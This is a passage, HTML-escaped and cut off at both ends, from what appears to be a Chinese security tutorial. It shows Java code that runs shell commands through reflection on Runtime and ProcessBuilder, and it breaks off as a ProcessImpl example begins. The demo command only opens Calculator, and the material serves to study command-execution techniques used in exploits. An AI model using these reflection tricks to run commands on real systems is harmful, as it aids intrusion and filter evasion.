        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;


    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Runtime2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;// 利用构造函数 private Runtime() &amp;#123;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.Runtime&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt; runtime &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;ProcessBuilder&quot;&gt;&lt;a href=&quot;#ProcessBuilder&quot; class=&quot;headerlink&quot; title=&quot;ProcessBuilder&quot;&gt;&lt;/a&gt;ProcessBuilder&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;constructor&lt;/code&gt;初始化对象的时候，接收的参数是一个Object数组，所以需要&lt;code&gt;new Object[]&lt;/code&gt;强制转换: &lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPB0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessBuilder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;//newInstance接收的是一个Object数组，需要转化一下&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt; pb &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pb&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPB1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessBuilder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//当使用List类型的构造参数&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;//newInstance接收的是一个Object数组，需要转化一下&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt; pb &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;asList&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pb&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt; reflectProcessBuilder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//        reflectProcessBuilder.ReflectPB0();&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;reflectProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ReflectPB1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ProcessImpl&quot;&gt;&lt;a href=&quot;#ProcessImpl&quot; class=&quot;headerlink&quot; title=&quot;ProcessImpl&quot;&gt;&lt;/a&gt;ProcessImpl&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
